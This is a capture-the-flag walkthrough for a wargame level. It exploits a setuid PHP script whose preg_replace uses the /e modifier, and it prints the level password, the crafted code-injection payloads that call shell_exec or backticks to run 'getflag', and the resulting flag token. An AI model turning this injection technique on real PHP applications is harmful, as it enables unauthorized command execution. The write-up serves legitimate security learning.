# Level 06

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level06@192.168.1.32
	Password: viuaaale9huek52boumoomioc
	```

1. Check files.

	```sh
	> ls -l
	total 12
	-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
	-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
	```

1. Let me guess, we gonna have to find a PHP vulnerability ?

	```sh
	> ./level06
	PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

	> cat level06.php
	#!/usr/bin/php
	<?php
	function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
	function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
	$r = x($argv[1], $argv[2]); print $r;
	?>
	```

1. Damn, that's ugly code. Let's analyze it.

	```php
	<?php

	function y($m)
	{
		# Replace `.` (dot) by ` x ` (letter X with a space before and after) in $m
		$m = preg_replace("/\./", " x ", $m);
		# Replace `@` (at) by ` y` (letter Y with space before) in $m
		$m = preg_replace("/@/", " y", $m);
		# Return the modified string
		return $m;
	}

	function x($y, $z)
	{
		# Open file $y and store its content into $a
		$a = file_get_contents($y);
		# Replace `[x ...]` (letter X followed by a space then anything, the whole between brackets) by `y("\2")` (letter Y followed by parenthesis with quotes inside, which themselves have a backslash followed by the digit 2 inside)
		# But what does the `/e` means on the REGEX ?
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
		# Replace `[` (open bracket) by `(` (open parenthesis) in $a
		$a = preg_replace("/\[/", "(", $a);
		# Replace `]` (close bracket) by `)` (close parenthesis) in $a
		$a = preg_replace("/\]/", ")", $a);
		# Return the modified string
		return $a;
	}

	# Call the function `x` with the script call arguments 1 and 2
	# But the function `x` doesn't do anything with the second one, so just ignore it
	$r = x($argv[1], $argv[2]);
	# Print the result
	print $r;

	?>
	```

1. Overall, nothing too fancy, except that one line which stands out due to the unusual `/e`.

	```php
	...
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	...
	```

1. What does the documentation has to say about it ?

	```
	https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
	```

1. Well, nothing about it... What about Google ?

	```
	https://www.google.com/search?q=php+regex+%252Fe
	https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
	```

1. Eurêka! That's it, we even have an exemple. Go for it, but let's summarize what we know.

	```
	1. We have to run ./level06 with a file as file as argument
	2. The contents of the file will be stored in $a
	3. `[x ...]` with be replaced by a PHP execution of as PHP code `y("...")`
	...
	```

1. So, by reversing it, we end up with something like:

	```
	1. We want to execute a the 'getflag' shell command. PHP has a function called `shell_exec` for that.

	shell_exec("getflag")

	2. We need to match the REGEX expression

	[x shell_exec("getflag")]

	3. Stop! We forgot to escape the command from the PHP string

	[x ".shell_exec("getflag)."]
	```

1. Let's try it.

	```sh
	# Default concatenation using "." (dot)
	> echo "[x \".shell_exec(\"getflag\").\"]" > /tmp/exploit06.php
	> ./level06 /tmp/exploit06.php
	" x shell_exec("getflag") x "

	# Use of "{}" to
	> echo "[x {shell_exec(\"getflag\")}]" > /tmp/exploit06.php
	> ./level06 /tmp/exploit06.php
	{shell_exec("getflag")}

	# But "{}" only works for variables... So fake it
	> echo "[x {\${shell_exec(\"getflag\")}}]" > /tmp/exploit06.php
	> ./level06 /tmp/exploit06.php
	PHP Parse error:  syntax error, unexpected T_CONSTANT_ENCAPSED_STRING, expecting T_STRING in /home/user/level06/level06.php(4) : regexp code on line 1
	PHP Fatal error:  preg_replace(): Failed evaluating code:
	y("{${shell_exec(\"getflag\")}}") in /home/user/level06/level06.php on line 4

	# To fix this error, we just need to remove quote escape
	> echo "[x {\${shell_exec("getflag")}}]" > /tmp/exploit06.php
	> ./level06 /tmp/exploit06.php
	PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	in /home/user/level06/level06.php(4) : regexp code on line 1
	```

1. Finally, we got it!

	```sh
	> echo "[x {\${shell_exec("getflag")}}]" > /tmp/exploit06.php
	> ./level06 /tmp/exploit06.php
	...
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	...
	```

1. Futhermore, if we check the `exec_shell` documentation, we notice that we can replace the function call by backticks.

	```sh
	> echo "[x \${\`getflag\`}]" > /tmp/exploit06.php
	> ./level06 /tmp/exploit06.php
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	in /home/user/level06/level06.php(4) : regexp code on line 1
	```

## Documentation

- Language: [PHP](https://www.php.net/)
- String: [PHP String Parsing](https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing)
- Function: [preg_replace](https://www.php.net/manual/en/function.preg-replace.php)
- Function: [file_get_contents](https://www.php.net/manual/en/function.file-get-contents.php)
- Function: [print](https://www.php.net/manual/en/function.print.php)
- Function: [exec_shell](https://www.php.net/manual/en/function.exec.php)
